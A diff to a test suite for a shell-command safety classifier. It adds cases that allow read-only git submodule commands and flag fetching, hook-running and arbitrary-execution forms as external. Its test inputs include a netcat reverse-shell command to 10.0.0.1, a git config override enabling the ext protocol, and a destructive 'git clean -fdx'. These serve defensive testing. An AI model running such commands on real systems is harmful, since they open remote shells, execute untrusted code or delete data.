@@ -251,6 +251,32 @@ describe('analyzeShellCommand', () => {
     assert.equal(analyzeShellCommand('git clone https://x/y', root).verdict, 'external')
   })
 
+  it('carves out read-only git submodule reads but keeps update/add/foreach external (#500)', () => {
+    // Local-only reads (recorded SHAs + working-tree state, like `git status`).
+    for (const cmd of ['git submodule', 'git submodule status', 'git submodule summary']) {
+      assert.equal(
+        analyzeShellCommand(cmd, root).verdict,
+        'sandbox',
+        `expected sandbox for: ${cmd}`,
+      )
+    }
+    // Network fetch + checkout/hook or arbitrary-exec forms stay a hard prompt.
+    for (const cmd of [
+      'git submodule update --init',
+      'git submodule update --init --recursive',
+      'git submodule add https://x/y vendor/y',
+      'git submodule foreach git clean -fdx',
+      'git -c protocol.ext.allow=always submodule update',
+    ]) {
+      const r = analyzeShellCommand(cmd, root)
+      assert.equal(r.verdict, 'external', `expected external for: ${cmd}`)
+      assert.ok(
+        r.reasons.some((x) => /submodule/.test(x)),
+        `missing submodule reason for: ${cmd}`,
+      )
+    }
+  })
+
   it('flags ncat', () => {
     assert.equal(analyzeShellCommand('ncat -e /bin/sh 10.0.0.1 4444', root).verdict, 'external')
   })
